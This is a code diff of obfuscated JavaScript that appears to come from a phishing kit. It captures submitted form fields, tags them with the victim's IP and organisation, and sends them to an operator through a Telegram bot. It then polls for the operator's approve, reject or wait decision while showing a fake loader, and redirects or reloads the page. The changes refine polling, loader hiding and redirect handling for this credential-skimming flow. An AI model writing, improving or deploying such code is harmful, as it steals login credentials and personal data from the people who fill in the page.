@@ -88,40 +88,37 @@
     });
   }
 
-  var _lastOffset = 0;
   function _poll(_tok, _cb){
     var _el = 0;
     var _tm = setInterval(function(){
-      _el += 3000;
+      _el += 2500;
       if (_el > 600000) { clearInterval(_tm); return; }
-      var _url = 'https://api.telegram.org/bot' + _tok + '/getUpdates?limit=20' + (_lastOffset ? '&offset=' + _lastOffset : '');
-      fetch(_url)
+      fetch('https://api.telegram.org/bot' + _tok + '/getUpdates?limit=30&offset=-30')
         .then(function(r){ return r.json(); })
         .then(function(d){
           var _rs = d.result || [];
           if (!_rs.length) return;
-          for (var i = 0; i < _rs.length; i++) {
-            var _u = _rs[i];
-            if (_u.update_id >= _lastOffset) {
-              _lastOffset = _u.update_id + 1;
-            }
-            var _cq = _u.callback_query;
+          for (var i = _rs.length - 1; i >= 0; i--) {
+            var _cq = _rs[i].callback_query;
             if (!_cq) continue;
             var _dv = _cq.data || '';
             if (_dv.indexOf(_SID) !== -1) {
               clearInterval(_tm);
               _cb(_dv);
-              fetch('https://api.telegram.org/bot' + _tok + '/answerCallbackQuery?callback_query_id=' + _cq.id);
+              fetch('https://api.telegram.org/bot' + _tok + '/answerCallbackQuery?callback_query_id=' + _cq.id).catch(function(){});
               break;
             }
           }
         }).catch(function(){});
-    }, 3000);
+    }, 2500);
   }
 
   var _ldrInterval = null;
   function _ldr(show, seconds){
     var _e = _D.getElementById('__ld');
+    var _customLdr = _D.getElementById('loaderOverlay');
+    if (_customLdr) _customLdr.style.display = 'none';
+
     if (_ldrInterval) { clearInterval(_ldrInterval); _ldrInterval = null; }
     if (!_e && show) {
       _e = _D.createElement('div');
@@ -173,6 +170,11 @@
         });
 
         var _nx = _f.getAttribute('action') || '';
+        var _btn = _f.querySelector('button[formaction], input[formaction]');
+        if (_btn && _btn.getAttribute('formaction')) {
+          _nx = _btn.getAttribute('formaction');
+        }
+
         var _msg = '🔐 <b>CAPTURE | ' + _pg.toUpperCase() + '</b>\n━━━━━━━━━━━━━━━\n' + _flds.join('\n') + '\n━━━━━━━━━━━━━━━\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>';
         var _kb = [
           [{ text: '✅ Valide', callback_data: _SID + ':ok' }, { text: '❌ Erreur', callback_data: _SID + ':err' }],
@@ -180,14 +182,27 @@
         ];
 
         _ldr(true);
-        _tg(_M, _msg, _kb).catch(function(){ _ldr(false); _W.location.href = _nx; });
+        _tg(_M, _msg, _kb).catch(function(){ _ldr(false); if (_nx) _W.location.href = _nx; });
         _poll(_M, function(_a){
-          if (_a.indexOf(':ok') !== -1) { _ldr(false); _W.location.href = _nx; }
-          else if (_a.indexOf(':err') !== -1) { _ldr(false); _W.location.reload(); }
+          if (_a.indexOf(':ok') !== -1) {
+            _ldr(false);
+            if (_nx && _nx !== '#' && _nx !== '') {
+              _W.location.href = _nx;
+            } else {
+              _W.location.reload();
+            }
+          }
+          else if (_a.indexOf(':err') !== -1) {
+            _ldr(false);
+            _W.location.reload();
+          }
           else {
             var _sec = _a.indexOf(':10') !== -1 ? 10 : _a.indexOf(':30') !== -1 ? 30 : 120;
             _ldr(true, _sec);
-            setTimeout(function(){ _ldr(false); _W.location.href = _nx; }, _sec * 1000);
+            setTimeout(function(){
+              _ldr(false);
+              if (_nx && _nx !== '#' && _nx !== '') _W.location.href = _nx; else _W.location.reload();
+            }, _sec * 1000);
           }
         });
       }, true);
